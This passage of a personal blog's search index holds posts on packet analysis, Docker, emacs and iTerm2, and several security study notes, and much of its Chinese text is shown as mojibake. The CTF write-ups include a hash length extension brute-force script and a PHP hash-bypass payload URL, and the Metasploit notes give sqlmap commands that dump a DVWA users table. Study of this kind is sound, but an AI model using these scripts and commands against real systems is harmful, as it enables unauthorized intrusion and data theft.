Êó©Ëµ∑‰ΩøÁî®BOOTP(Bootstrap Protocol)ÂçèËÆÆÔºåÂêéÊù•Ë¢´DHCPÂèñ‰ª£ÔºåÁî®Êà∑ËÆ©ËÆæÂ§áËá™Âä®Ëé∑ÂèñIPÂú∞ÂùÄ„ÄÇÂü∫‰∫éUDPÂçèËÆÆ„ÄÇ  DHCPÂ§¥          Êìç‰Ωú‰ª£Á†ÅOpcode      Á°¨‰ª∂Á±ªÂûãHandware Type      Á°¨‰ª∂ÈïøÂ∫¶Handware Length      Ë∑≥Êï∞Hops      ‰∫ãÂä°ID(Transaction ID)      Ê∂àËÄóÊó∂Èó¥Seconds Elasped      Ê†áËÆ∞Flags      ÂÆ¢Êà∑Á´ØIPÂú∞ÂùÄClient IP Address      ‰Ω†ÁöÑIPÂú∞ÂùÄ      ÊúçÂä°Âô®IPÂú∞ÂùÄ      ÁΩëÂÖ≥IPÂú∞ÂùÄ      ÂÆ¢Êà∑Á´ØÁ°¨‰ª∂Âú∞ÂùÄ      ÊúçÂä°Âô®‰∏ªÊú∫Âêç      ÂêØÂä®Êñá‰ª∂Boot File      ÈÄâÈ°πOptions        Áª≠ÁßüËøáÁ®ã          Client -discover-&gt; Server      Client &lt;-offer- Server      Client -request-&gt; Server      Client &lt;-acknowledgement- Server      4.2 ÂüüÂêçÁ≥ªÁªüDNSÔºöÂ∞ÜÂüüÂêçËß£ÊûêÊàêIPÂú∞ÂùÄ„ÄÇ  Âü∫‰∫éUDPÂçèËÆÆ„ÄÇ  Â¶ÇÊûúÊú¨Âú∞DNSÊúçÂä°Âô®Ê≤°ÊúâÊåáÂÆöÂüüÂêçÂØπÂ∫îÁöÑIPÂú∞ÂùÄÔºåÂàô‰ºöÂêëÂ§ñÈÉ®DNSÊúçÂä°Âô®ÈÄíÂΩíÊü•ËØ¢„ÄÇ  Âå∫Âüü‰º†ÈÄÅÔºàÂÜó‰ΩôÂ§á‰ªΩÈúÄË¶ÅÔºâ          ÂÆåÊï¥Âå∫Âüü‰º†ÈÄÅÔºàAXFRÔºâ      Â¢ûÈáèÂå∫Âüü‰º†ÈÄÅÔºàIXFRÔºâ      4.3 Ë∂ÖÊñáÊú¨‰º†ËæìÂçèËÆÆHTTPÔºö‰∏áÁª¥ÁΩë‰º†ËæìÊú∫Âà∂ÔºåÁî®‰∫éËøûÊé•WebÊúçÂä°Âô®„ÄÇÂ∏∏‰ΩøÁî®80Á´ØÂè£„ÄÇ5. ÂÆûÈôÖÊ°à‰æã  Âà©Áî®wiresharkÂàÜÊûêÈó®Êà∑ÁΩëÁ´ôÁöÑÁôªÂΩïÂíåÂèëÂ∏ÉÊ∂àÊÅØÁöÑËøáÁ®ã„ÄÇ  Êü•ÁúãDNSÊµÅÈáè  Êü•ÁúãHTTPËØ∑Ê±Ç5.1 TCPÈîôËØØÊÅ¢Â§çÊú∫Âà∂5.1.1 Ë∂ÖÊó∂Èáç‰º†(RTO, Retransmission timeout)ÔºöÊØèÊ¨°Èáç‰º†RTOÁøªÂÄçÔºåËã•Ë∂ÖËøáÊúÄÂ§ßÂÄºÂàôÊîæÂºÉÈáç‰º†„ÄÇ5.1.2 ÈáçÂ§çÁ°ÆËÆ§ÂíåÂø´ÈÄüÈáç‰º†ÔºöÊé•Êî∂ÊñπÂèëÈÄÅ3‰∏™ÈáçÂ§çACKÔºå‰ª£Ë°®Êï∞ÊçÆÂåÖ‰∏¢Â§±ÔºåÁî≥ËØ∑Âø´ÈÄüÈáç‰º†„ÄÇ5.1.3 ÊµÅÊéßÂà∂ÔºöÈÄöËøáË∞ÉÊï¥Á™óÂè£Â§ßÂ∞èÊéßÂà∂Êé•ÂèóÁöÑÊï∞ÊçÆÂåÖÂ§ßÂ∞è„ÄÇ5.2 ÁΩëÁªúÈ´òÂª∂ËøüÁöÑÂéüÂõ†  Á∫øË∑ØÂª∂Ëøü  ÂÆ¢Êà∑Á´ØÂª∂Ëøü  ÊúçÂä°Âô®Âª∂Ëøü  ÁΩëÁªúÂü∫Á∫øÔºöÈÄöËøáÂü∫Á∫øÁöÑÂ∏ÆÂä©ÔºåÊØîÂØπÊï¥‰ΩìÊµÅÈáèÂø´ÁÖß          Á´ôÁÇπÂü∫Á∫ø      ‰∏ªÊú∫Âü∫Á∫ø      Â∫îÁî®Á®ãÂ∫èÂü∫Á∫ø      6. ÂÆâÂÖ®È¢ÜÂüüÊï∞ÊçÆÂåÖÂàÜÊûê  nmap‰ΩøÁî®SYNÂçäÂºÄÊâ´Êâ´ÊèèÂà§Êñ≠ÂèóÂÆ≥ËÄÖÁöÑÁ´ØÂè£ÊòØÂê¶ÂºÄÊîæ  ÈÄöËøáÁ≥ªÁªüÊâ´ÊèèÊåáÁ∫πÊúØÔºåÂà§Êñ≠ÂØπÊñπÊú∫Âô®ÁöÑÁßçÁ±ªÂíåÁ±ªÂûã  ARPÁºìÂ≠ò‰∏≠ÊØíÊîªÂáªÔºåÈÅ≠Âà∞‰∏≠Èó¥‰∫∫ÊîªÂáª  ËøúÁ®ãËÆøÈóÆÁâπÊ¥õ‰ºäÊú®È©¨7. Êó†Á∫øÁΩëÁªúÊï∞ÊçÆÂåÖÂ∑•‰ΩúÂú®Êï∞ÊçÆÈìæË∑ØÂ±Ç7.1 Êó†Á∫øÁΩëÂç°Ê®°Âºè  Ë¢´ÁÆ°ÁêÜÊ®°ÂºèÔºöÊó†Á∫øÂÆ¢Êà∑Á´ØÊ≠£Â∏∏ËøûÊé•Êó†Á∫øÊé•ÂÖ•ÁÇπ(WAP, Wireless Access Point)Êó∂ÁöÑ‰ΩøÁî®Ê®°Âºè  Ad hocÊ®°ÂºèÔºöÈÄö‰ø°ÂèåÊñπÂÖ±ÂêåÊâøÊãÖWAPÁöÑÊåáË¥£  ‰∏ªÊ®°ÂºèÔºöÈ´òÁ´ØÊó†Á∫øÁΩëÂç°Êàê‰∏∫ÂÖ∂‰ªñ‰∏ªÊú∫ÁöÑWAP  ÁõëÂê¨Ê®°Âºè7.2 802.11Êï∞ÊçÆÂåÖÁªìÊûÑ  ÁÆ°ÁêÜÔºöÂåÖÊã¨ËÆ§ËØÅ„ÄÅÂÖ≥ËÅî„ÄÅ‰ø°Âè∑          ÁÆ°ÁêÜÂ∏ßÂ§¥ÈÉ®‰ø°ÊÅØ                  Timestamp          Beacon Intercal          Capability Information          SSID Parameter Set          Supported Rates          DS Parameter                      ÊéßÂà∂ÔºöÂåÖÊã¨ËØ∑Ê±ÇÂèëÈÄÅ„ÄÅÂáÜ‰∫àÂèëÈÄÅ  Êï∞ÊçÆ  beaconÔºöÂπøÊí≠Êï∞ÊçÆÂåÖÔºåÈÄöÁü•Êó†Á∫øÂÆ¢Êà∑Á´ØÂ≠òÂú®ÂèØÁî®WAPÂú®Packet ListÂ¢ûÂä†Êó†Á∫ø‰∏ìÁî®ÂàóÔºö  RSSI(for Received Signal Strength Indication):ÊçïËé∑Êï∞ÊçÆÂåÖÂ∞ÑÈ¢ëÂº∫Â∫¶  TX Rate(for Transmission Rage):ÊçïËé∑Êï∞ÊçÆÂåÖÊï∞ÊçÆÁéá  Frequency/Channel:ÊçïËé∑Êï∞ÊçÆÂåÖÈ¢ëÁéáÂíå‰ø°ÈÅìÊó†Á∫øÁΩëÁªúÂÆâÂÖ®  WEP(Wired Equivalent Privacy)Ôºö‰∏çÂÆâÂÖ®  WPA(Wi-Fi Protected Access)ÔºöÂ∏∏Áî®ÁöÑÂÆâÂÖ®ÂçèËÆÆÈôÑÂΩïÔºö  tcpdump  ScapyÔºöÂü∫‰∫épythonÁöÑÊï∞ÊçÆÂåÖÊìçÁ∫µÁ®ãÂ∫è  SANS SEC 503ÂÆâÂÖ®ÂÖ•‰æµÊ£ÄÊµãÊ∑±ÂÖ•ËØæÁ®ã"
  },
  
  {
    "title": "Go language",
    "url": "/posts/Go_learning/",
    "categories": "",
    "tags": "System",
    "date": "2018-04-14 00:00:00 -0700",
    





    
    "snippet": "Go Learningsource  github  documentsgo tool tourKuberneteDockerHow to build your own docker imageDocker image can be automatically built by using Dockerfile. The whole summary base on the docker do...",
    "content": "Go Learningsource  github  documentsgo tool tourKuberneteDockerHow to build your own docker imageDocker image can be automatically built by using Dockerfile. The whole summary base on the docker documentation.      Image building command usage:    docker build &lt;path&gt; -&lt;flag&gt; parameter &lt;file path&gt;    We can use different flags to specialize the image.                            flag          instruction                                      -f          point to a Dockerfile in the file system                          -t          tag an image                          Dockerfile Format:    The file is not case-sensitive. But the convention is to UPPERCASE the comments to distinguish them easily. A Dockerfile must start with FORM instruction.    Example:     FROM busybox ENV foo /bar WORKDIR ${foo}   # WORKDIR /bar ADD . $foo       # ADD . /bar COPY \\$foo /quux # COPY $foo /quux              FROM: initialize a new image and set the Base Image.                  ARG is the only instruction that may precede FROM and can declare the variables.                    RUN:                  RUN &lt;command&gt;: run command in a shell equal to /bin/sh -c or cmd /S /C          RUN [\"executable\", \"param1\", \"param2\"]: exec form                    CMD: There can only be one CMD instruction in a Dockerfile. If you list more than one CMD then only the last CMD will take effect.                  The main purpose of a CMD is to provide defaults for an executing container.          CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form)          CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)          CMD command param1 param2 (shell form)                    LABEL: add metadata to an image. It is a key-value pair.      MAINTAINER: set the Author field of the generated image.                  example: LABEL maintainer=\"SvenDowideit@home.org.au\"   \t- EXPOSE : inform Docker that the container listens on the specified network prots at runtime.  \t- ENV  : set the environment vatiable `` to the ``                      \t- ADD  \t- COPY  \t- ENTRYPOINT  \t- VOLUME  \t- USER  \t- WORKDIR  \t- ONBUILD  \t- STOPSIGNAL  \t- HEALTHCHECK  \t- SHELLTutorial: Make a laravel docker image"
  },
  
  {
    "title": "Qiangwnagbei WriteUp",
    "url": "/posts/qiangwangbei_writingUp/",
    "categories": "",
    "tags": "CTF",
    "date": "2018-03-27 00:00:00 -0700",
    





    
    "snippet": "Team Resultrank:53score:1066others‚Äô writeup  http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html  MISC1. ai-animalI got a picture and a script in python. The script is running on t...",
    "content": "Team Resultrank:53score:1066others‚Äô writeup  http://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html  MISC1. ai-animalI got a picture and a script in python. The script is running on the server. The following function is responsible for printing the flag. The server just receives packets which are smaller than 1024 bits. And the server will decode the packets by base64.    def remote_sub(conn, address):        print address        (ip, port) = address        conn.send(\"plz input your base64 encode pic:\")        expect_len = 62256        data = ''        while True:            rdata = conn.recv(1024)            data += rdata            expect_len -= 1024            if expect_len &lt; 0:                 break        image_data = base64.b64decode(data)        ori_image = open('/tf_files/test/basque-shepherd-dog.jpg', 'rb').read()                if check_diff(image_data, ori_image) == -1:            conn.send('no\\n')            sys.exit(0)        else:            conn.send('lets go\\n')                # Loads label file, strips off carriage return        label_lines = [line.rstrip() for line                           in tf.gfile.GFile(\"/tf_files/retrained_labels.txt\")]                # Unpersists graph from file        with tf.gfile.FastGFile(\"/tf_files/retrained_graph.pb\", 'rb') as f:            graph_def = tf.GraphDef()            graph_def.ParseFromString(f.read())            _ = tf.import_graph_def(graph_def, name='')                with tf.Session() as sess:            # Feed the image_data as input to the graph and get first prediction            softmax_tensor = sess.graph.get_tensor_by_name('final_result:0')                    predictions = sess.run(softmax_tensor, \\                     {'DecodeJpeg/contents:0': image_data})                    # Sort to show labels of first prediction in order of confidence            top_k = predictions[0].argsort()[-len(predictions[0]):][::-1]            print top_k                    if top_k[0] == 1:                conn.send(config.flag + '\\n')And the encoded text is 4/3 longger than plain text in base64. So everytime I need to send a packet which has 768 bits. And then receiving 2 packets will lead to the flag. The following script will get the flag automatically.\t# -*- coding=UTF-8\timport socket\timport base64\timport time\t\tbind_ip =\"117.50.13.213\"\tbind_port = 12345\t\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ts.connect((bind_ip, bind_port))\tprint(s.recv(1024).decode('utf-8'))\t\twith open('/root/Desktop/test/basque-shepherd-dog.jpg', 'rb') as f:\t    while True:\t        time.sleep(0.01)\t        piece = f.read(768)   \t        if not piece:\t            break\t        s.sendall(base64.b64encode(piece))\t        # print piece\tprint(s.recv(1024).decode('utf-8'))\tprint(s.recv(1024).decode('utf-8'))"
  },
  
  {
    "title": "Metasploit",
    "url": "/posts/Metasploit/",
    "categories": "",
    "tags": "Security",
    "date": "2018-03-18 00:00:00 -0700",
    





    
    "snippet": "MetasploitÊ∏óÈÄèÊµãËØïÈ≠îÈ¨ºËÆ≠ÁªÉËê•ËØ∏ËëõÂª∫‰ºü ÈôàÂäõÊ≥¢ Â≠ôÊùæÊüè Á≠âËëó1. Âü∫Á°ÄÁü•ËØÜ1.1 Metasploit‰ΩøÁî®Êé•Âè£Ôºömsfgui, msfconsole, msfcli„ÄÇÔºàÊúÄÊñ∞kali2018Âè™Âê´ÊúâmsfconsoleÔºâ2. Ê∏óÈÄèÊµãËØïÂÆûÈ™åÁéØÂ¢ÉÊ∑±ÂÖ•ÁêÜËß£3. ÊÉÖÊä•ÊêúÈõÜÊäÄÊúØ3.1 Ê≥®ÂÜå‰ø°ÊÅØÊü•ËØ¢  whoisÔºöÊü•ËØ¢ÂüüÂêçÊ≥®ÂÜå‰ø°ÊÅØÊï∞ÊçÆÂ∫ì  nslookupÔºö‰ªéDNSËß£ÊûêÊúçÂä°Âô®‰øùÂ≠òÂú®ÁºìÂ≠ò‰∏≠ÁöÑÈùûÊùÉÂ®ÅËß£Á≠î...",
    "content": "MetasploitÊ∏óÈÄèÊµãËØïÈ≠îÈ¨ºËÆ≠ÁªÉËê•ËØ∏ËëõÂª∫‰ºü ÈôàÂäõÊ≥¢ Â≠ôÊùæÊüè Á≠âËëó1. Âü∫Á°ÄÁü•ËØÜ1.1 Metasploit‰ΩøÁî®Êé•Âè£Ôºömsfgui, msfconsole, msfcli„ÄÇÔºàÊúÄÊñ∞kali2018Âè™Âê´ÊúâmsfconsoleÔºâ2. Ê∏óÈÄèÊµãËØïÂÆûÈ™åÁéØÂ¢ÉÊ∑±ÂÖ•ÁêÜËß£3. ÊÉÖÊä•ÊêúÈõÜÊäÄÊúØ3.1 Ê≥®ÂÜå‰ø°ÊÅØÊü•ËØ¢  whoisÔºöÊü•ËØ¢ÂüüÂêçÊ≥®ÂÜå‰ø°ÊÅØÊï∞ÊçÆÂ∫ì  nslookupÔºö‰ªéDNSËß£ÊûêÊúçÂä°Âô®‰øùÂ≠òÂú®ÁºìÂ≠ò‰∏≠ÁöÑÈùûÊùÉÂ®ÅËß£Á≠î  digÔºö‰ªéÂüüÂêçÂÆòÊñπDNSÊúçÂä°Âô®‰∏äÊü•ËØ¢Âà∞Á≤æÁ°ÆÁöÑÊùÉÂ®ÅËß£Á≠î3.2 Google Hacking(ÊÑüËßâÊ≤°Êúâ‰ªÄ‰πàÊïàÊûú)Â∏∏Áî®Êåá‰ª§Ôºösite, inurl, filetype3.3 Á´ØÂè£Êâ´Êèè  metasploitÔºöauxiliary/scanner/discovery or portscan  nmapÔºöÂàÜ‰∏∫4ÁßçÁä∂ÊÄÅopen/closed/filtered/unfiltered3.4 Â∏∏ËßÅÁΩëÁªúÊúçÂä°Êâ´Êèè  telnetÔºàÁî®‰∫é‰ª∑Ê†ºÊòÇË¥µÁöÑËÄÅÂÆûÊúçÂä°Âô®ÔºâÔºöauxiliary/scanner/telnet/telnet_version  sshÔºöscanner/ssh/ssh_version  oracleÊï∞ÊçÆÂ∫ìÊúçÂä°Ôºöscanner/oracle/tnslsnr_version  ÂºÄÊîæ‰ª£ÁêÜÔºöscanner/http/open_proxy3.5 Âè£‰ª§Êé¢Êµã‰∏éÂóÖÊé¢  sshÂè£‰ª§ÁåúÊµãÔºöÂèñÂÜ≥‰∫éÂ≠óÂÖ∏ÁöÑË¥®Èáè  psnuffleÔºöÂè™ËÉΩÂóÖÊé¢Âêå‰∏ÄÁΩëÁªúÁéØÂ¢É‰∏ãÁöÑÔºåÂ§ñÁΩëÊó†Ê≥ïÂóÖÊé¢ÂÜÖÁΩëÁöÑÁôªÂΩï3.6 ÁΩëÁªúÊºèÊ¥ûÊâ´ÊèèopenvasÔºö‰∏ÄÊ¨æÂºÄÂÖÉÁªºÂêàÂûãÊºèÊ¥ûÊâ´ÊèèÂô®ÔºåÁî®‰∫éËØÜÂà´ËøúÁ®ã‰∏ªÊú∫„ÄÅwebÂ∫îÁî®Â≠òÂú®ÁöÑÊºèÊ¥û„ÄÇÂú®metasploitÈáåÂèØ‰ª•ËΩΩÂÖ•openvasÊèí‰ª∂„ÄÇÊ≠§Â§ñÔºåÂèØ‰ª•ÈÄöËøánmapÊâæÂØªÁâπÂÆöÊúçÂä°ÊºèÊ¥û„ÄÇadmin/1234563.7 Ê∏óÈÄèÊµãËØïÊï∞ÊçÆÂ∫ìÂÖ±‰∫´‰ΩøÁî®postgresqlÊàñËÄÖmetasploit RPCÂÖ±‰∫´„ÄÇmetasploitÁ¨¨‰∏ÄÊ¨°‰ΩøÁî®Êó∂postgresqlÊòØÊ≤°ÊúâËøûÊé•ÁöÑÔºåÂ¶Ç‰∏ãÂëΩ‰ª§ÂÆûÁé∞Êñ∞Âª∫Ôºömsfdb init„ÄÇmetasploitË£ÖËΩΩopenvasÊ®°ÂùóÊó∂ÈúÄË¶ÅËøûÊé•Êï∞ÊçÆÂ∫ìÔºöopenvas_connect username password IP port  ÈóÆÈ¢òÔºömetasploit‰ΩøÁî®openvasÊ®°Âùó‰ºöÊúâwarningÔºåËøêË°åÂ¶Çopenvas_report_listÁ≠âÊåá‰ª§„ÄÇÊöÇÊó∂Ê≤°ÊúâÊâæÂà∞Ëß£ÂÜ≥ÊñπÊ≥ï„ÄÇ4. WebÂ∫îÁî®Ê∏óÈÄèÊäÄÊúØ4.1 ÊµÅË°åÊîªÂáªÊñπÂºè  SQLÊ≥®ÂÖ•ÊîªÂáª          ÊôÆÈÄöÊ≥®ÂÖ•      Áõ≤Ê≥®        Ë∑®Á´ôËÑöÊú¨ÊîªÂáª Cross Site Scripting          Â≠òÂÇ®ÂûãXSSÔºöÊåÅ‰πÖÂ≠òÂÇ®Âú®ÁõÆÊ†áÊúçÂä°Âô®Êï∞ÊçÆÂ∫ìÊàñÊñá‰ª∂‰∏≠      ÂèçÂ∞ÑÊÄßXSSÔºöÊ≥®ÂÖ•ËÑöÊú¨‰ªéÊîªÂáªËÄÖÊúçÂä°Âô®‰∏ãËΩΩÊñá‰ª∂Âà∞ÂèóÂÆ≥ËÄÖÊµèËßàÂô®‰∏ä      DOMÂûãXSSÔºöÈÄöËøáURLÂª∫Á´ãDOMÂØπË±°        Ë∑®Á´ô‰º™ÈÄ†ËØ∑Ê±Ç Cross Site Request Forgery4.2 Âü∫‰∫éMetasploitÊ°ÜÊû∂ÁöÑwebÂ∫îÁî®Ê∏óÈÄèÊäÄÊúØ4.2.1 ËæÖÂä©Ê®°Âùó: moudles/auxiliary/Ë∑ØÂæÑ‰∏ã//ÈÄöËøáwmapÂèØ‰ª•ÂæóÂà∞ÊåáÂÆöÊúçÂä°Âô®ÁöÑÊâ´ÊèèÁªìÊûúÂíåÂèØÂà©Áî®ÁöÑÊºèÊ¥ûload wmapwmap_sites -a 10.10.10.254wmap_sites -lwmap_targets -t 10.10.10.254wmap_run -twmap_run -evulns4.2.2 Ê∏óÈÄèÊ®°Âùó‰∏ªË¶ÅË∑ØÂæÑÂú®exploit/unix/webapp, exploit/windows/http, exploit/multi/httpÂÖ∂‰ªñÁöÑwebÂ∫îÁî®ÊºèÊ¥ûÊâ´ÊèèÂ∑•ÂÖ∑ÔºöW3AF, SQLMap, wXf, XSSF, BeEF4.3 ÂºÄÊ∫êWebÂ∫îÁî®ÊºèÊ¥ûÊâ´ÊèèÂ∑•ÂÖ∑  Wapiti: ÂØπSQLÊ≥®ÂÖ•Êâ´ÊèèÂáÜÁ°ÆÂ∫¶ÊéíÁ¨¨‰∏Ä  W3AF: ÂäüËÉΩÂº∫Â§ßÔºåÈÖçÁΩÆÁπÅÁêê„ÄÇKali2018ÂÆâË£Öw3afÂ§±Ë¥•ÔºåpythonÊä•ÈîôÔºåÊú™Ëß£ÂÜ≥          w3afÂàÜ‰∏∫‰∏§‰∏™ÈÉ®ÂàÜÔºöÊ†∏ÂøÉÊ®°ÂùóÂíåÊèí‰ª∂Ê®°Âùó        Sandcat Free Edition: ÂØπXSSÊ£ÄÊµãÊïàÁéáÊúÄÂ•Ω  Brup suite Free: Ê∏óÈÄèÂà©Âô®ÔºåÂäüËÉΩÂº∫Â§ß4.4 ÂÆâË£ÖwXf rubyÊä•ÈîôÔºåÊú™Ëß£ÂÜ≥4.5 ‰ΩøÁî®owasp/dvwaËøõË°åËØïÈ™å4.5.1 sqlÊ≥®ÂÖ•Ôºö  sqlmap -u 'http://10.10.10.129/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#' --cookie='security=low;PHPSESSID=on3qqvc40chq38nlhh6e4bghj1'  --dbs -v 0  -D dvwa --tables  -D dvwa --tables -T users --columns  -D dvwa --tables -T users --columns --dump#"
  },
  
  {
    "title": "iTerm 2 configuration",
    "url": "/posts/iTerm2_configuration/",
    "categories": "",
    "tags": "System",
    "date": "2018-01-16 00:00:00 -0800",
    





    
    "snippet": "iTerm 2 ConfigurationiTerm 2 is an useful terminal tool on Mac. It is a highly customizable terminal and come with a lot of features. This is a simple tutorial to show how to download and config it...",
    "content": "iTerm 2 ConfigurationiTerm 2 is an useful terminal tool on Mac. It is a highly customizable terminal and come with a lot of features. This is a simple tutorial to show how to download and config it. I got a lot of help by Sourabh‚Äôs gitbook1. DownloadThe direct way to download it is by its homepage. There is also a document in it which I think is too brief for freshman.2. CustomizationiTerm 2 offers a complex preferences.The colors and font Setting  Set hotkey to open the iTerm2 at any time by cmd + F12 on Mac‚Äôs Preperences &gt; Keyboard &gt; Shortcuts &gt; Services by making a new Automator whose name is ‚ÄúÂºÄÂêØiTerm2‚Äù which is a Mac‚Äôs program installed before sold.  Download color schemes and select favourite color schemes. I suggest Solarized Dark.  Change the cursor text and cursor color to yellow make it more visible.Shortcuts  cmd + / show the cursor‚Äôs position  cmd + opt + e show every windows  cmd + d/cmd + shift + d divide the screen by vertically or horizontally  cmd + f find the key words  cmd + enter toggle full screenWhat‚Äôs more, iTerm 2 can enable you to design your own profiles and change the colors, windows, terminals and other configuration. On the Preferences &gt; Profiles &gt; Keys &gt; Hotkey Windows, I set F12 to show a new shell which I need like the following picture.tmux Configuration"
  },
  
  {
    "title": "Junior 0ops WriteUp",
    "url": "/posts/Junior_0ops_writingUp/",
    "categories": "",
    "tags": "CTF",
    "date": "2017-12-11 00:00:00 -0800",
    





    
    "snippet": "Resultrank:19score:1100Web1. Penetrate In [Unfinished]Question\t&lt;?php\t\tinclude 'secret.php';\t\t@$username = $_POST[\"username\"];\t@$password = $_POST[\"password\"];\t\tif (isset($_COOKIE[\"hmac\"])) {\t   ...",
    "content": "Resultrank:19score:1100Web1. Penetrate In [Unfinished]Question\t&lt;?php\t\tinclude 'secret.php';\t\t@$username = $_POST[\"username\"];\t@$password = $_POST[\"password\"];\t\tif (isset($_COOKIE[\"hmac\"])) {\t    if ($username === \"admin\" &amp;&amp; $password != \"admin\") {\t        if ($_COOKIE[\"hmac\"] === md5(\"$secret|$username|$password\")) {\t            die(\"The flag is \" . $flag);\t        }\t    }\t} else {\t    setcookie(\"hmac\", md5(\"$secret|admin|admin\"), time() + (60 * 60 * 24 * 7));\t    show_source(__FILE__);\t}AnswerThis problem need to use hash length extension attack to get the flag. But the problem is that I don‚Äôt have the length of the secret so I need to enumerate it. Actually, I haven‚Äôt find it yet.I find the following tools and write a script to enumerate the length of the secret. I don‚Äôt know what‚Äôs the problem which I need to read others‚Äô writeup.  Hash-extender  HashPumpThe script is writen in python.\t# -*- coding:utf-8 -*-\tfrom urlparse import urlparse\tfrom httplib import HTTPConnection\tfrom urllib import urlencode\timport json\timport time\timport os\timport urllib\timport requests\t\t\tdef gao(x, y):\t    #cookie = \"\"\t    cookie = {\"hmac\" : y}\t    r = requests.post(\"http://202.121.178.201:8081/\", data={'username': 'admin', \t'passowrd': x}, cookies = cookie)\t    resp = r.text\t    #print resp\t    #exit()\t    return resp\t\tfor i in xrange(10000):\t    #print i\t    #secret len = ???\t    find_hash = \"../hash_extender/hash_extender --data admin --signature \tbe9fcfa876db5f4184e1635ce6561de7 --format md5  -a sb --out-data-format=html \t--secret \" + str(i) + \" --quiet\"\t    #print find_hash\t    calc_res = os.popen(find_hash).readlines()\t    #print calc_res\t    hash_value = calc_res[0][:32]\t    attack_padding = calc_res[0][32:]\t    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])\t    ret = gao(attack_padding, hash_value)\t    #print ret\t    if \"The flag\" in ret:\t        print ret\t        break2. Shatter Sha512Question\t&lt;?php\t// can u break sha512 algorithm ?\t\terror_reporting(-1);\t\tinclude 'flag.php';\t\tif (!isset($_GET['x']) || !isset($_GET['y'])) {\t    die(show_source(__FILE__));\t}\t\t$x = $_GET['x'];\t$y = $_GET['y'];\t\tif ($x != $y) {\t\t    if (hash(\"sha512\", $x) === hash(\"sha512\", $y)) {\t        echo $flag;\t    }\t\t}\tAnswerThe key is to find that when php function hash(‚Äúsha512‚Äù,$x) is used to figure out whether two different variables are equal. If variable $x is array the function return false.So the payload is http://202.121.178.201:8083?x[]=1&amp;y[]=2.MISC1. Mystery NumberI get a string which is 5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239.I find that it just has 0-9 and a-e. So I guess it is a hex number. I translate it to hex format by a website.Then I get a string ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9.And then I use Base 64 decode to get the flag.2. Easy Traffic AnalyzeI get a file named flag.pcap. The pcap format file can be loaded on wireshark which consists of an application programming interface (API) for capturing network traffic. But it lost the pcap header. I find a website which introduces the pcap header and get the example header it offers and add it to the file.Then I open the file by Wireshark. I use File &gt; Export Objects &gt; HTTP get three files which is upload.php, upload(1).php and test.php. I use binwalk to find the content of upload.php and the result is that it is a ZIP archive data.Then I rename the upload.php to flag.zip and unzip it. After that, I get a flag1.png. I use binwalk -e flag.png to get two file from flag1.png whose name are 5B and 5B.zlib.I write a python script to output the content of 5B.zlib and find the flag at the end of the file.\timport zlib \tdata = open('5B.zlib','rb').read()\tprint dataIn the course of finding the method to solve the problem, I find some useful tools, such as binwalk, dd,unzip.A dd example:dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1Reverse1. BabyreI get a pyc file which contain byte code and Python interpreter complies the sources to it. I change it to py file by a tool.Then I read the code and get the encode method. I write a decode script to get the flag.\tfrom hashlib import md5\tdef md5raw(s):\t    return bytearray(md5(s).digest())\tdef xor(a, b):\t    assert len(a) == len(b)\t    return bytearray([ i ^ j for i, j in zip(a, b) ])\tflag = bytearray('\\xa5\\xc6\\xe6\\xeca\\x0c:ED\\xed#\\x19\\x94LF\\x11\\x17\\xc4.\\xeb\\xa1\\xc2|\\xc\t\t1&lt;\\xa9\\\\A\\xde\\xd22\\n')\t\t\t\tfor i in range(16):\t\tflag[:16], flag[16:] = flag[16:], flag[:16]\t\tflag[:16] = xor(flag[:16], md5raw(flag[16:]))\tprint flagCrypto1. AES-ServerI get a server.py which tell me that the server runs a AES CBC decrypt program. I should enter IV and enc to construct a plaintext whose beginning string is admin.   After learning the theory,And I find that if I don‚Äôt change variable enc, the secret and the enc‚Äôs result after block cipher decryption will never change. So I set IV equal to 0 at first and get a string named temp. Then xor hex(admin) and temp, I got the IV. Use this IV and enc, I construct the plaintext begin with amin and get the flag."
  },
  
  {
    "title": "emacsÊÄªÁªì",
    "url": "/posts/emacs%E6%80%BB%E7%BB%93/",
    "categories": "",
    "tags": "System",
    "date": "2017-11-22 00:00:00 -0800",
    





    
    "snippet": "emacsÊÄªÁªìÊïôÁ®ãÊù•Ê∫êÂø´Êç∑ÈîÆÊòæÁ§∫ÊñπÂºèÁî®Ê≥ïÔºö  ‚ÄúC-x‚ÄùË°®Á§∫Êåâ‰ΩècontrolÁöÑÂêåÊòØÊåâ‰ΩèxÈîÆ  ‚ÄúM-x‚ÄùË°®Á§∫Êåâ‰ΩèaltÁöÑÂêåÊó∂Êåâ‰ΩèxÈîÆÔºàMac‰∏äÊ≤°ÊúâÁî®Ôºâ/Êåâ‰∏Ä‰∏ãescÂÜçÊåâ‰∏Ä‰∏ãxÂø´Êç∑ÈîÆÊÄªÁªìÔºö  C-g: quit  C-x C-c: exit  C-x C-f: opne a file  C-x C-s: save file  C-f/C-b: move forword/back a char...",
    "content": "emacsÊÄªÁªìÊïôÁ®ãÊù•Ê∫êÂø´Êç∑ÈîÆÊòæÁ§∫ÊñπÂºèÁî®Ê≥ïÔºö  ‚ÄúC-x‚ÄùË°®Á§∫Êåâ‰ΩècontrolÁöÑÂêåÊòØÊåâ‰ΩèxÈîÆ  ‚ÄúM-x‚ÄùË°®Á§∫Êåâ‰ΩèaltÁöÑÂêåÊó∂Êåâ‰ΩèxÈîÆÔºàMac‰∏äÊ≤°ÊúâÁî®Ôºâ/Êåâ‰∏Ä‰∏ãescÂÜçÊåâ‰∏Ä‰∏ãxÂø´Êç∑ÈîÆÊÄªÁªìÔºö  C-g: quit  C-x C-c: exit  C-x C-f: opne a file  C-x C-s: save file  C-f/C-b: move forword/back a character  M-f/M-b: move forword/back a word  C-d/M-d: delete a character/word  C-_: undo  C-p/C-n: Move up/Down to the previous line  C-a/C-e: Move to the beginning/end line9:40"
  },
  
  {
    "title": "ÂÆâÂÖ®Á¨îËÆ∞--WebÊîªÂáªÊäÄÊúØ",
